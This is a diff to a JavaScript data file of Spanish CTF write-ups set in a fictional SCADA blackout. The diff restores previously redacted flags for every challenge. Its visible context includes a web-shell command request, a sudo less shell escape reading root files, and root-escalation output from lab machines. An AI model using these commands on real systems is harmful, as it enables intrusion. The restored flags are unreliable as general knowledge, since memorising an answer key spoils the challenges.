@@ -1,4 +1,4 @@
-// Auto-generated writeup data — flags and sensitive data redacted
+// Auto-generated writeup data
 const WRITEUPS = [
   {
     id: "api-de-sectores",
@@ -6,6 +6,7 @@ const WRITEUPS = [
     category: "Web",
     points: 250,
     slug: "api-de-sectores",
+    files: ["startlab.sh", "blackout-web03.tar"],
     content: `# API de sectores
 
 **Categoría:** Web · **Puntos:** 250
@@ -19,7 +20,7 @@ const WRITEUPS = [
 >
 > **Consejo:** enumera la IP del lab con nmap. El tablero de campo carga la telemetría de tu zona.
 
-**Flag:** \`[REDACTED]\`
+**Flag:** \`WHOAMI{id0r_s3ct0r21}\`
 
 ---
 
@@ -126,7 +127,7 @@ Decodificando:
 
 \`\`\`bash
 $ echo "V0hPQU1Je2lkMHJfczNjdDByMjF9" | base64 -d
-[REDACTED]
+WHOAMI{id0r_s3ct0r21}
 \`\`\`
 
 *"idor sector 21"* en leetspeak — la flag era justamente la referencia al fallo de acceso a ese sector.
@@ -141,6 +142,7 @@ Un endpoint REST que usa un ID de recurso directo (\`/api/sector/{id}\`) debe va
     category: "Pentesting",
     points: 300,
     slug: "archivo-de-turnos",
+    files: ["startlab.sh", "blackout-pt02.tar"],
     content: `# Archivo de turnos
 
 **Categoría:** Pentesting · **Puntos:** 300
@@ -154,7 +156,7 @@ Un endpoint REST que usa un ID de recurso directo (\`/api/sector/{id}\`) debe va
 >
 > **Consejo:** empieza por nmap. El portal de archivo no es el único sitio donde el turno deja material.
 
-**Flag:** \`[REDACTED]\`
+**Flag:** \`WHOAMI{arch1v0_turn0s}\`
 
 ---
 
@@ -256,7 +258,7 @@ uid=0(root) gid=0(root)
 
 \`\`\`bash
 $ cat /tmp/f
-[REDACTED]
+WHOAMI{arch1v0_turn0s}
 \`\`\`
 
 *"archivo turnos"* en leetspeak.
@@ -271,15 +273,16 @@ El material de un reto puede vivir fuera del index: \`robots.txt\` y el listado 
     category: "Misc",
     points: 300,
     slug: "bitacora-del-blackout",
+    files: ["turno.log", "alerta.wav", "spectrogram.png"],
     content: `# Bitácora del blackout
 
 **Categoría:** Misc · **Puntos:** 300
 
-> Export parcial del turno SCADA + alarma de audio. Reconstruye la secuencia y envía \`[REDACTED]\`.
+> Export parcial del turno SCADA + alarma de audio. Reconstruye la secuencia y envía \`WHOAMI{...}\`.
 >
 > **Consejo:** no todas las líneas \`[SYNC-FRAG]\` son útiles.
 
-**Flag:** \`[REDACTED]\`
+**Flag:** \`WHOAMI{b17ac0r4_4ud10_m0r53}\`
 
 ---
 
@@ -300,12 +303,18 @@ Un log de texto y un WAV mono de 8 kHz. La decisión: como hay un audio de corta
 **Herramienta:** \`base32 -d\`. **Por qué:** al leer el log, las líneas \`[SYNC-FRAG]\` tienen un \`payload=\` con un patrón de letras mayúsculas y \`=\`, que es la firma del **base32** (codificación en base 32 con relleno \`=\`).
 
 \`\`\`bash
-$ echo "K5EE6QKNJF5Q====" | base32 -d   # [REDACTED]
+$ echo "K5EE6QKNJF5Q====" | base32 -d   # WHOAMI{
+$ echo "MIYTOYLDGBZDIXY=" | base32 -d   # b17ac0r4_
+$ echo "GR2WIMJQL4======" | base32 -d   # 4ud10_
+$ echo "NUYHENJTPU======" | base32 -d   # m0r53}
 \`\`\`
 
 | Línea | Hora | payload (base32) | Decodificado |
 |---|---|---|---|
-| SYNC-FRAG-04 | 03:14:01 | \`K5EE6QKNJF5Q====\` | \`[REDACTED]\` |
+| SYNC-FRAG-04 | 03:14:01 | \`K5EE6QKNJF5Q====\` | \`WHOAMI{\` |
+| SYNC-FRAG-02 | 03:14:08 | \`MIYTOYLDGBZDIXY=\` | \`b17ac0r4_\` |
+| SYNC-FRAG-03 | 03:14:15 | \`GR2WIMJQL4======\` | \`4ud10_\` |
+| SYNC-FRAG-01 | 03:14:22 | \`NUYHENJTPU======\` | \`m0r53}\` |
 
 > Ojo: la línea \`[ERROR] FRAG falso positivo payload=JBSWY3DPEEQ====\` decodifica a \`Hello\` — un señuelo. La pista del reto ("no todas las líneas SYNC-FRAG son útiles") avisa que hay fragmentos falsos. Por eso **no** me fié del número de fragmento.
 
@@ -328,10 +337,10 @@ El Morse dice **TIME**: la clave es el **orden temporal** (los timestamps), no e
 
 ### 3. Reconstruir la flag
 
-Ordenando por hora: \`[REDACTED]\`
+Ordenando por hora: \`WHOAMI{\` + \`b17ac0r4_\` + \`4ud10_\` + \`m0r53}\`
 
 \`\`\`
-[REDACTED]
+WHOAMI{b17ac0r4_4ud10_m0r53}
 \`\`\`
 
 *"bitacora audio morse"* en leetspeak — la bitácora, el audio y el Morse eran todo el desafío.
@@ -346,15 +355,16 @@ Cuando un reto mezcle log + audio, mira qué hay *dentro* del audio (espectrogra
     category: "Cripto",
     points: 500,
     slug: "boveda-keepass",
+    files: ["ingeniero.kdbx", "politica_acceso.txt"],
     content: `# Bóveda KeePass
 
 **Categoría:** Cripto · **Puntos:** 500
 
-> Bóveda KeePass (ingeniero.kdbx) con las claves de recuperación del sector 14. Abre la entrada y envía \`[REDACTED]\`.
+> Bóveda KeePass (ingeniero.kdbx) con las claves de recuperación del sector 14. Abre la entrada y envía \`WHOAMI{...}\`.
 >
 > **Consejo:** KeePassXC + politica_acceso.txt, o keepass2john / hashcat -m 13400.
 
-**Flag:** \`[REDACTED]\`
+**Flag:** \`WHOAMI{k33p4ss_b0v3d4_14}\`
 
 ---
 
@@ -407,7 +417,7 @@ La flag suele vivir en campos marcados como *protegidos*, así que se muestra to
 $ echo "Ingeniero.Norte2026" | keepassxc-cli show -q -s --all "ingeniero.kdbx" "Blackout LATAM/Recuperación sector 14"
 Title: Recuperación sector 14
 UserName: ingeniero.campo@redlatam.energia
-Password: [REDACTED]
+Password: WHOAMI{k33p4ss_b0v3d4_14}
 URL:
 Notes: Solo usar si el SCADA central no responde.
 \`\`\`
@@ -424,6 +434,7 @@ Una bóveda KeePass vale lo que vale su contraseña maestra: si el formato de es
     category: "Web",
     points: 425,
     slug: "carga-de-evidencias",
+    files: ["startlab.sh", "blackout-web05.tar"],
     content: `# Carga de evidencias
 
 **Categoría:** Web · **Puntos:** 425
@@ -437,7 +448,7 @@ Una bóveda KeePass vale lo que vale su contraseña maestra: si el formato de es
 >
 > **Consejo:** enumera la IP del lab con nmap. Hay una bandeja para archivar evidencias de campo.
 
-**Flag:** \`[REDACTED]\`
+**Flag:** \`WHOAMI{up10ad_3v1d3nc14}\`
 
 ---
 
@@ -553,7 +564,7 @@ $ curl "http://172.17.0.2/evidencias/evidencia.phtml?c=cat /var/lib/latam/eviden
 REGISTRO=V0hPQU1Je3VwMTBhZF8zdjFkM25jMTR9
 
 $ echo "V0hPQU1Je3VwMTBhZF8zdjFkM25jMTR9" | base64 -d
-[REDACTED]
+WHOAMI{up10ad_3v1d3nc14}
 \`\`\`
 
 *"upload evidencia"* en leetspeak — la flag apunta a la subida de evidencias.
@@ -568,15 +579,16 @@ Una subida de archivos que valida \`getimagesize()\` pero no limita qué extensi
     category: "Misc",
     points: 100,
     slug: "cartel-en-la-subestacion",
+    files: ["subestacion.jpg"],
     content: `# Cartel en la subestación
 
 **Categoría:** Misc · **Puntos:** 100
 
-> Durante el apagón LATAM, un operador documentó la subestación Norte. Analiza la foto y encuentra \`[REDACTED]\`.
+> Durante el apagón LATAM, un operador documentó la subestación Norte. Analiza la foto y encuentra \`WHOAMI{...}\`.
 >
 > **Consejo:** las cámaras y los SCADA suelen guardar más datos de los que se ven en la imagen.
 
-**Flag:** \`[REDACTED]\`
+**Flag:** \`WHOAMI{3x1f_r3v34l4d_sub3st4c10n}\`
 
 ---
 
@@ -593,7 +605,7 @@ software=Panel SCADA export v2.1], baseline, precision 8, 1200x675
 $ exiftool -a -u -g1 subestacion.jpg
 ...
 ---- ExifIFD ----
-User Comment    : [REDACTED]
+User Comment    : WHOAMI{3x1f_r3v34l4d_sub3st4c10n}
 \`\`\`
 
 La flag estaba directamente en el campo \`User Comment\`. Los demás campos (\`Software: Panel SCADA export v2.1\`, \`Artist: Operador turno noche (Red LATAM)\`, \`Copyright: Uso interno...\`) son ambientación del reto.
@@ -610,15 +622,16 @@ Antes de buscar estego o hacer análisis pesado, revisa siempre los metadatos: \
     category: "Misc",
     points: 500,
     slug: "coordenadas-del-apagon",
+    files: ["qr_a.png", "qr_b.png", "qr_c.png", "comunicado.html", "cargas.csv"],
     content: `# Coordenadas del apagón
 
 **Categoría:** Misc · **Puntos:** 500
 
-> Paquete incompleto del mapa de verificación (sector 14). Recompone el mapa y envía \`[REDACTED]\`.
+> Paquete incompleto del mapa de verificación (sector 14). Recompone el mapa y envía \`WHOAMI{...}\`.
 >
 > **Consejo:** tres imágenes son una sola pieza partida.
 
-**Flag:** \`[REDACTED]\`
+**Flag:** \`WHOAMI{m4p4_bl4ck0ut_c00rd3n4d4s}\`
 
 ---
 
@@ -666,14 +679,27 @@ El QR revela las coordenadas de las celdas a consultar: \`(1,1)\`, \`(1,4)\`, \`
 
 | Coordenada | Valor \`sigilo\` | Decodificado (base32) |
 |---|---|---|
-| 1,1 | \`K5EE6QKNJF5Q====\` | \`[REDACTED]\` |
+| 1,1 | \`K5EE6QKNJF5Q====\` | \`WHOAMI{\` |
+| 1,4 | \`NU2HANC7\` | \`m4p4_\` |
+| 2,2 | \`MJWDIY3LGA======\` | \`bl4ck0\` |
+| 3,3 | \`OV2F6YZQ\` | \`ut_c0\` |
+| 4,1 | \`GBZGIM3O\` | \`0rd3n\` |
+| 4,4 | \`GRSDI435\` | \`4d4s}\` |
 
 \`\`\`bash
 $ echo "K5EE6QKNJF5Q====" | base32 -d
-[REDACTED]
+WHOAMI{
 \`\`\`
 
-**\`[REDACTED]\`**
+### 4. Concatenar
+
+Siguiendo el orden exacto que devuelve el QR:
+
+\`\`\`
+WHOAMI{ + m4p4_ + bl4ck0 + ut_c0 + 0rd3n + 4d4s}
+\`\`\`
+
+**\`WHOAMI{m4p4_bl4ck0ut_c00rd3n4d4s}\`**
 
 > La flag en leetspeak dice *"mapa blackout coordenadas"*.
 
@@ -687,6 +713,7 @@ Cuando un reto entregue varias tiras de imagen, únelas primero (\`convert -appe
     category: "Web",
     points: 350,
     slug: "diagnostico-de-enlace",
+    files: ["startlab.sh", "blackout-web04.tar"],
     content: `# Diagnóstico de enlace
 
 **Categoría:** Web · **Puntos:** 350
@@ -697,7 +724,7 @@ Cuando un reto entregue varias tiras de imagen, únelas primero (\`convert -appe
 >
 > **Consejo:** enumera la IP del lab con nmap. Hay un visor de diagnóstico de nodo.
 
-**Flag:** \`[REDACTED]\`
+**Flag:** \`WHOAMI{cmd1_enlac3_n0rt3}\`
 
 ---
 
@@ -768,7 +795,7 @@ El valor termina en \`==\`, firma de **base64**:
 
 \`\`\`bash
 $ echo "V0hPQU1Je2NtZDFfZW5sYWMzX24wcnQzfQ==" | base64 -d
-[REDACTED]
+WHOAMI{cmd1_enlac3_n0rt3}
 \`\`\`
 
 *"cmd inyección enlace norte"* en leetspeak.
@@ -783,15 +810,16 @@ Un campo que se mete en un \`shell_exec\` es oro. Si el filtro bloquea \`;\` y \
     category: "Forense",
     points: 500,
     slug: "evidencia-en-http",
+    files: ["sala_control.pcap"],
     content: `# Evidencia en HTTP
 
 **Categoría:** Forense · **Puntos:** 500
 
-> Descarga PNG desde el portal forense capturada en sala de control. Extrae el archivo del PCAP y envía \`[REDACTED]\`.
+> Descarga PNG desde el portal forense capturada en sala de control. Extrae el archivo del PCAP y envía \`WHOAMI{...}\`.
 >
 > **Consejo:** hay una transferencia HTTP con \`Content-Type: image/png\`.
 
-**Flag:** \`[REDACTED]\`
+**Flag:** \`WHOAMI{pcp4_c4rv3_4nd_m3rg3}\`
 
 ---
 
@@ -830,7 +858,7 @@ Se recuperó el PNG completo.
 \`\`\`bash
 $ exiftool -a export/evidencia_sala.png
 ...
-Comment                         : [REDACTED]
+Comment                         : WHOAMI{pcp4_c4rv3_4nd_m3rg3}
 \`\`\`
 
 La flag está en el campo \`Comment\` del PNG. *"pcap carve and merge"* — extraer (carve) el objeto del PCAP y revisar sus metadatos.
@@ -845,15 +873,16 @@ Ante un PCAP con transferencia de archivos, usa \`--export-objects http\` para e
     category: "Forense",
     points: 300,
     slug: "exfiltracion-dns",
+    files: ["exfil_dns.pcap"],
     content: `# Exfiltración DNS
 
 **Categoría:** Forense · **Puntos:** 300
 
-> Consultas DNS anómalas hacia \`exfil.blackout.redlatam\`. Reconstruye la secuencia y envía \`[REDACTED]\`.
+> Consultas DNS anómalas hacia \`exfil.blackout.redlatam\`. Reconstruye la secuencia y envía \`WHOAMI{...}\`.
 >
 > **Consejo:** filtra \`dns.qry.name\` o protocolo DNS en Wireshark.
 
-**Flag:** \`[REDACTED]\`
+**Flag:** \`WHOAMI{dns_3xf1l_bl4ck0ut}\`
 
 ---
 
@@ -892,13 +921,15 @@ $ tshark -r exfil_dns.pcap -Y "dns.qry.type == 16" -T fields -e dns.qry.name | s
 **Herramienta:** \`base32 -d\`. **Por qué:** los fragmentos son base32. El base32 usa mayúsculas; el dominio va en minúsculas, así que se normaliza a mayúsculas antes de decodificar:
 
 \`\`\`bash
-$ echo "K5EE6QKNJF5Q" | base32 -d   # [REDACTED]
+$ echo "K5EE6QKNJF5Q" | base32 -d   # WHOAMI{
+$ echo "MRXHGXY"      | base32 -d   # dns_
+$ echo "GN4GMMLML5RGYNDDNMYHK5D5" | base32 -d   # 3xf1l_bl4ck0ut}
 \`\`\`
 
 Concatenando \`01\` → \`02\` → \`03\`:
 
 \`\`\`
-[REDACTED]  =  [REDACTED]
+WHOAMI{ + dns_ + 3xf1l_bl4ck0ut}  =  WHOAMI{dns_3xf1l_bl4ck0ut}
 \`\`\`
 
 *"dns exfil blackout"* en leetspeak — la exfiltración por DNS del blackout.
@@ -913,6 +944,7 @@ En un PCAP con DNS sospechoso, filtra por \`dns.qry.name\`, fíjate en dominios 
     category: "Web",
     points: 500,
     slug: "gateway-scada",
+    files: ["startlab.sh", "blackout-web06.tar"],
     content: `# Gateway SCADA
 
 **Categoría:** Web · **Puntos:** 500
@@ -923,7 +955,7 @@ En un PCAP con DNS sospechoso, filtra por \`dns.qry.name\`, fíjate en dominios 
 >
 > **Consejo:** enumera la IP del lab con nmap. Hay un gateway que consulta la URL de un nodo.
 
-**Flag:** \`[REDACTED]\`
+**Flag:** \`WHOAMI{ssrf_pl4nt4_n0rt3}\`
 
 ---
 
@@ -982,12 +1014,12 @@ La cadena parece ROT/Caesar. \`ZKRDPL\` con desplazamiento **−3** = \`WHOAMI\`
 
 \`\`\`bash
 $ echo "ZKRDPL{vvui_so4qw4_q0uw3}" | tr 'A-Za-z' 'X-ZA-Wx-za-w'
-[REDACTED]
+WHOAMI{ssrf_pl4nt4_n0rt3}
 \`\`\`
 
 *"ssrf planta norte"* en leetspeak.
 
-> **Nota anti-trampa:** el binario interno \`/sbin/sys-daemon\` contiene otra cadena \`[REDACTED]\` — es un **honeypot** para quien haga \`docker exec cat /root/flag.txt\` en vez de resolver el SSRF. La flag real solo sale por el servicio interno.
+> **Nota anti-trampa:** el binario interno \`/sbin/sys-daemon\` contiene otra cadena \`WHOAMI{docker_exec_detected_n1ce_try}\` — es un **honeypot** para quien haga \`docker exec cat /root/flag.txt\` en vez de resolver el SSRF. La flag real solo sale por el servicio interno.
 
 ## Lección
 
@@ -999,6 +1031,7 @@ El SSRF con bloqueo de \`localhost\` no protege nada: se bypasea con representac
     category: "Web",
     points: 125,
     slug: "informe-sector-14",
+    files: ["startlab.sh", "blackout-web01.tar"],
     content: `# Informe sector 14
 
 **Categoría:** Web · **Puntos:** 125
@@ -1009,7 +1042,7 @@ El SSRF con bloqueo de \`localhost\` no protege nada: se bypasea con representac
 >
 > **Consejo:** enumera la IP del lab con nmap. El portal expone varias secciones internas.
 
-**Flag:** \`[REDACTED]\`
+**Flag:** \`WHOAMI{lf1_d0c_s3ct0r14}\`
 
 ---
 
@@ -1064,7 +1097,7 @@ El valor \`REGISTRO=\` termina en \`=\` y tiene caracteres que delatan **base64*
 
 \`\`\`bash
 $ echo "V0hPQU1Je2xmMV9kMGNfczNjdDByMTR9" | base64 -d
-[REDACTED]
+WHOAMI{lf1_d0c_s3ct0r14}
 \`\`\`
 
 *"lfi doc sector14"* en leetspeak.
@@ -1079,6 +1112,7 @@ Ante un parámetro que incluye archivos (\`?informe=xxx.php\`), prueba path trav
     category: "Pentesting",
     points: 500,
     slug: "intranet-del-patio",
+    files: ["startlab.sh", "blackout-pt04.tar"],
     content: `# Intranet del patio
 
 **Categoría:** Pentesting · **Puntos:** 500
@@ -1092,7 +1126,7 @@ Ante un parámetro que incluye archivos (\`?informe=xxx.php\`), prueba path trav
 >
 > **Consejo:** empieza por nmap. Hay más de un servicio y más de una cuenta.
 
-**Flag:** \`[REDACTED]\`
+**Flag:** \`WHOAMI{1ntr4n3t_p4t10_n14}\`
 
 ---
 
@@ -1221,7 +1255,7 @@ $ /usr/lib/latam/in_apply
 $ cat /tmp/pwned
 uid=0(root) gid=0(root)
 $ cat /tmp/f
-[REDACTED]
+WHOAMI{1ntr4n3t_p4t10_n14}
 \`\`\`
 
 *"intranet patio n14"* en leetspeak.
@@ -1236,6 +1270,7 @@ Cadena clásica de pentesting: SNMP filtra contexto → código fuente filtra un
     category: "Web",
     points: 175,
     slug: "login-del-operador",
+    files: ["startlab.sh", "blackout-web02.tar"],
     content: `# Login del operador
 
 **Categoría:** Web · **Puntos:** 175
@@ -1246,7 +1281,7 @@ Cadena clásica de pentesting: SNMP filtra contexto → código fuente filtra un
 >
 > **Consejo:** enumera la IP del lab con nmap. El portal pide identificación de guardia.
 
-**Flag:** \`[REDACTED]\`
+**Flag:** \`WHOAMI{sql1_g3r3nt3_n0rt3}\`
 
 ---
 
@@ -1320,7 +1355,7 @@ La nota del **gerente** es base64:
 
 \`\`\`bash
 $ echo "V0hPQU1Je3NxbDFfZzNyM250M19uMHJ0M30=" | base64 -d
-[REDACTED]
+WHOAMI{sql1_g3r3nt3_n0rt3}
 \`\`\`
 
 *"sql gerente norte"* en leetspeak.
@@ -1335,15 +1370,16 @@ Los formularios de login con intercalación directa de variables en SQL son un b
     category: "Cripto",
     points: 400,
     slug: "mascara-latam",
+    files: ["boveda.zip", "hash_maestra.sha256", "pista_ingeniero.txt"],
     content: `# Máscara LATAM
 
 **Categoría:** Cripto · **Puntos:** 400
 
-> Clave maestra del temporizador SCADA documentada solo como SHA256. La misma clave protege \`boveda.zip\`. Recupera \`[REDACTED]\`.
+> Clave maestra del temporizador SCADA documentada solo como SHA256. La misma clave protege \`boveda.zip\`. Recupera \`WHOAMI{...}\`.
 >
 > **Consejo:** SHA256 sin salt → diccionario o ataque por máscara (\`hashcat -m 1400\`).
 
-**Flag:** \`[REDACTED]\`
+**Flag:** \`WHOAMI{m4sk_r3gl4s_s3ct0r14}\`
 
 ---
 
@@ -1396,7 +1432,7 @@ La clave recuperada es **\`LATAM1414\`**.
 $ unzip -o -P LATAM1414 boveda.zip
 extracting: flag.txt
 $ cat flag.txt
-[REDACTED]
+WHOAMI{m4sk_r3gl4s_s3ct0r14}
 \`\`\`
 
 *"mask reglas sector14"* — el ataque por máscara según las reglas del sector 14.
@@ -1411,6 +1447,7 @@ Ante un SHA256 sin salt, no hay que invertirlo matemáticamente: se adivina. Si 
     category: "Pentesting",
     points: 125,
     slug: "nodo-del-patio-norte",
+    files: ["startlab.sh", "blackout-pt01.tar"],
     content: `# Nodo del patio Norte
 
 **Categoría:** Pentesting · **Puntos:** 125
@@ -1424,7 +1461,7 @@ Ante un SHA256 sin salt, no hay que invertirlo matemáticamente: se adivina. Si 
 >
 > **Consejo:** empieza por un nmap completo a la IP del lab. No asumas un solo puerto.
 
-**Flag:** \`[REDACTED]\`
+**Flag:** \`WHOAMI{ftp_p4t10_n0rt3}\`
 
 ---
 
@@ -1523,12 +1560,12 @@ Dos candidatos. Los leo por separado:
 \`\`\`bash
 $ printf '!/bin/sh -c "cat /root/flag.txt > /tmp/a; cat /var/lib/latam/patio.dat > /tmp/b"\\nq\\n' | script -qc "sudo less /etc/shadow" /dev/null
 === root/flag.txt ===
-[REDACTED]
+WHOAMI{docker_exec_detected_n1ce_try}
 === /var/lib/latam/patio.dat ===
-[REDACTED]
+WHOAMI{ftp_p4t10_n0rt3}
 \`\`\`
 
-**La flag real es \`/var/lib/latam/patio.dat\`**: \`[REDACTED]\`. La de \`/root/flag.txt\` es un **honeypot** — una trampa para quien intente \`docker exec cat /root/flag.txt\` en vez de resolver la cadena de ataque del reto (aparece el mismo señuelo en el reto Gateway SCADA). La flag del reto referencia justamente la vía de acceso: FTP + patio norte.
+**La flag real es \`/var/lib/latam/patio.dat\`**: \`WHOAMI{ftp_p4t10_n0rt3}\`. La de \`/root/flag.txt\` es un **honeypot** — una trampa para quien intente \`docker exec cat /root/flag.txt\` en vez de resolver la cadena de ataque del reto (aparece el mismo señuelo en el reto Gateway SCADA). La flag del reto referencia justamente la vía de acceso: FTP + patio norte.
 
 ## Lección
 
@@ -1540,15 +1577,16 @@ En pentesting no hay que asumir un único servicio: el nmap completo (\`-p-\`) d
     category: "Cripto",
     points: 125,
     slug: "pin-operador",
+    files: ["pin_operador.hash", "leeme.txt", "nota_recuperacion.zip"],
     content: `# PIN del operador
 
 **Categoría:** Cripto · **Puntos:** 125
 
-> Hash MD5 del PIN del panel local de la subestación Norte y un ZIP cifrado con esa misma clave. Recupera \`[REDACTED]\`.
+> Hash MD5 del PIN del panel local de la subestación Norte y un ZIP cifrado con esa misma clave. Recupera \`WHOAMI{...}\`.
 >
 > **Consejo:** identifica el tipo de hash (\`hashid\`, \`john --format=\`) y trabaja los tres archivos del pack.
 
-**Flag:** \`[REDACTED]\`
+**Flag:** \`WHOAMI{md5_p1n_0p3r4d0r}\`
 
 ---
 
@@ -1638,7 +1676,7 @@ extracting: flag.txt
 
 \`\`\`bash
 $ cat flag.txt
-[REDACTED]
+WHOAMI{md5_p1n_0p3r4d0r}
 \`\`\`
 
 *"md5 pin operador"* en leetspeak — la flag resume todo el flujo del reto.
@@ -1653,6 +1691,7 @@ Un PIN corto y predecible (como \`sector14\`) se recupera en segundos de su hash
     category: "Pentesting",
     points: 400,
     slug: "radio-de-campo",
+    files: ["startlab.sh", "blackout-pt03.tar"],
     content: `# Radio de campo
 
 **Categoría:** Pentesting · **Puntos:** 400
@@ -1666,7 +1705,7 @@ Un PIN corto y predecible (como \`sector14\`) se recupera en segundos de su hash
 >
 > **Consejo:** empieza por nmap. Un escaneo solo TCP se deja servicios de gestión fuera.
 
-**Flag:** \`[REDACTED]\`
+**Flag:** \`WHOAMI{rad10_camp0_n14}\`
 
 ---
 
@@ -1771,7 +1810,7 @@ $ cat /tmp/pwned
 uid=0(root) gid=0(root)
 
 $ cat /tmp/f
-[REDACTED]
+WHOAMI{rad10_camp0_n14}
 \`\`\`
 
 *"radio campo n14"* en leetspeak.
@@ -1786,15 +1825,16 @@ Dos puntos clave: (1) un escaneo solo TCP se pierde SNMP y demás servicios UDP 
     category: "Binarios",
     points: 125,
     slug: "rele-scada",
+    files: ["scada_relay"],
     content: `# Relé SCADA
 
 **Categoría:** Binarios · **Puntos:** 125
 
-> Firmware del relé SCADA SN-441 (ELF Linux x64). Recupera el token \`[REDACTED]\`.
+> Firmware del relé SCADA SN-441 (ELF Linux x64). Recupera el token \`WHOAMI{...}\`.
 >
 > **Consejo:** \`strings\`, \`file\` y \`chmod +x\`. Ejecutar en Kali/WSL/VM Linux.
 
-**Flag:** \`[REDACTED]\`
+**Flag:** \`WHOAMI{str1ngs_4nd_b64}\`
 
 ---
 
@@ -1850,7 +1890,7 @@ $ rabin2 -z scada_relay | grep TOKEN_B64
 
 \`\`\`bash
 $ echo "V0hPQU1Je3N0cjFuZ3NfNG5kX2I2NH0=" | base64 -d
-[REDACTED]
+WHOAMI{str1ngs_4nd_b64}
 \`\`\`
 
 El token en leetspeak dice *"strings and b64"* — justo la técnica usada.
@@ -1858,7 +1898,7 @@ El token en leetspeak dice *"strings and b64"* — justo la técnica usada.
 ### 5. Confirmar
 
 \`\`\`bash
-$ echo "[REDACTED]" | ./scada_relay
+$ echo "WHOAMI{str1ngs_4nd_b64}" | ./scada_relay
 [OK] Relé autorizado. Enviar token al arena CTF.
 \`\`\`
 
@@ -1872,15 +1912,16 @@ Antes de abrir un decompilador, pasa siempre \`strings\` por el binario y busca 
     category: "Cripto",
     points: 300,
     slug: "shadow-del-turno",
+    files: ["shadow_turno.txt", "export_consola.txt", "consola.zip"],
     content: `# Shadow del turno
 
 **Categoría:** Cripto · **Puntos:** 300
 
-> Backup parcial de /etc/shadow del servidor de consola. El password de operador.turno también abre el ZIP. Recupera \`[REDACTED]\`.
+> Backup parcial de /etc/shadow del servidor de consola. El password de operador.turno también abre el ZIP. Recupera \`WHOAMI{...}\`.
 >
 > **Consejo:** el hash empieza por \`$6$\` → sha512crypt.
 
-**Flag:** \`[REDACTED]\`
+**Flag:** \`WHOAMI{sh4d0w_turn0_n0rt3}\`
 
 ---
 
@@ -1938,7 +1979,7 @@ extracting: flag.txt
 
 \`\`\`bash
 $ cat flag.txt
-[REDACTED]
+WHOAMI{sh4d0w_turn0_n0rt3}
 \`\`\`
 
 *"shadow turno norte"* en leetspeak — el turno de guardia del sector norte y el origen del hash (\`/etc/shadow\`).
@@ -1953,15 +1994,16 @@ Un hash \`$6$\` (sha512crypt) de \`/etc/shadow\` no se puede invertir matemátic
     category: "Binarios",
     points: 300,
     slug: "telemetria-xor",
+    files: ["telemetry_decode"],
     content: `# Telemetría XOR
 
 **Categoría:** Binarios · **Puntos:** 300
 
-> Utilitario \`telemetry_decode\` (ELF Linux x64). Imprime payload en hex; recupera \`[REDACTED]\`.
+> Utilitario \`telemetry_decode\` (ELF Linux x64). Imprime payload en hex; recupera \`WHOAMI{...}\`.
 >
 > **Consejo:** \`chmod +x\` y ejecuta el binario. Si Permission denied, el bit de ejecución no está activo.
 
-**Flag:** \`[REDACTED]\`
+**Flag:** \`WHOAMI{x0r_t3l3m3tr14}\`
 
 ---
 
@@ -1996,7 +2038,7 @@ payload = bytes.fromhex('1b091b0000683739643312557f2d672c7e553e70603c')
 key = b'LATAM!'
 print(bytes(payload[i] ^ key[i % len(key)] for i in range(len(payload))).decode())
 "
-[REDACTED]
+WHOAMI{x0r_t3l3m3tr14}
 \`\`\`
 
 *"xor telemetria"* en leetspeak.
@@ -2011,15 +2053,16 @@ Cuando un binario imprima metadatos con \`cipher=xor\` y \`key=...\`, ejecútalo
     category: "Forense",
     points: 125,
     slug: "trafico-de-control",
+    files: ["blackout_control.pcap"],
     content: `# Tráfico de control
 
 **Categoría:** Forense · **Puntos:** 125
 
-> PCAP parcial del portal SCADA durante el apagón. El operador autenticó en claro; recupera \`[REDACTED]\`.
+> PCAP parcial del portal SCADA durante el apagón. El operador autenticó en claro; recupera \`WHOAMI{...}\`.
 >
 > **Consejo:** filtra tráfico HTTP en el puerto 80.
 
-**Flag:** \`[REDACTED]\`
+**Flag:** \`WHOAMI{http_pl41nt3xt_4p4g0n}\`
 
 ---
 
@@ -2060,7 +2103,7 @@ El cuerpo viaja en hexadecimal (form-urlencoded). Se decodifica a texto:
 \`\`\`bash
 $ tshark -r blackout_control.pcap -Y "http" -T fields -e http.file_data | \\
     python3 -c "import sys; print(bytes.fromhex(sys.stdin.read().strip()).decode())"
-user=operador.turno&pass=RedLatam2026!&nota_recuperacion=[REDACTED]&sector=14
+user=operador.turno&pass=RedLatam2026!&nota_recuperacion=WHOAMI{http_pl41nt3xt_4p4g0n}&sector=14
 \`\`\`
 
 La flag está en \`nota_recuperacion\`. "HTTP en claro (plaintext) = apagón", confirmando que el operador mandó credenciales sin cifrar por el puerto 80.
@@ -2075,15 +2118,16 @@ En un PCAP siempre filtra por protocolo (\`http\`) y mira los cuerpos de los POS
     category: "Binarios",
     points: 400,
     slug: "validador-de-turno",
+    files: ["turno_guard"],
     content: `# Validador de turno
 
 **Categoría:** Binarios · **Puntos:** 400
 
-> Validador \`turno_guard\` (ELF Linux x64). Solo acepta un token exacto \`[REDACTED]\`.
+> Validador \`turno_guard\` (ELF Linux x64). Solo acepta un token exacto \`WHOAMI{...}\`.
 >
 > **Consejo:** \`chmod +x\`. Prueba en Ghidra, Cutter o \`objdump -d\`.
 
-**Flag:** \`[REDACTED]\`
+**Flag:** \`WHOAMI{k3yg3n_bl4ck0ut}\`
 
 ---
 
@@ -2154,13 +2198,13 @@ $ objdump -s -j .rodata turno_guard
 \`\`\`python
 masked = bytes.fromhex('505c6e6f76012e095c05eea5cdefdfa6e3879ace7e6c58')
 flag = ''.join(chr(m ^ ((7 + 0xd*i) & 0xff)) for i, m in enumerate(masked))
-print(flag)   # [REDACTED]
+print(flag)   # WHOAMI{k3yg3n_bl4ck0ut}
 \`\`\`
 
 ### 4. Confirmar
 
 \`\`\`bash
-$ echo "[REDACTED]" | ./turno_guard
+$ echo "WHOAMI{k3yg3n_bl4ck0ut}" | ./turno_guard
 [OK] Turno autorizado. Envia el token al arena.
 \`\`\`
 
@@ -2174,15 +2218,16 @@ Un comparador con "clave progresiva" (XOR con contador) se revierte fácil: reco
     category: "Binarios",
     points: 500,
     slug: "vm-plc",
+    files: ["plc_ladder"],
     content: `# VM PLC
 
 **Categoría:** Binarios · **Puntos:** 500
 
-> Mini-VM ladder en \`plc_ladder\` (ELF Linux x64). Recupera la clave maestra \`[REDACTED]\`.
+> Mini-VM ladder en \`plc_ladder\` (ELF Linux x64). Recupera la clave maestra \`WHOAMI{...}\`.
 >
 > **Consejo:** \`chmod +x\`. Identifica el bucle de interpretación en el desensamblado.
 
-**Flag:** \`[REDACTED]\`
+**Flag:** \`WHOAMI{vm_plc_s3ctor14}\`
 
 ---
 
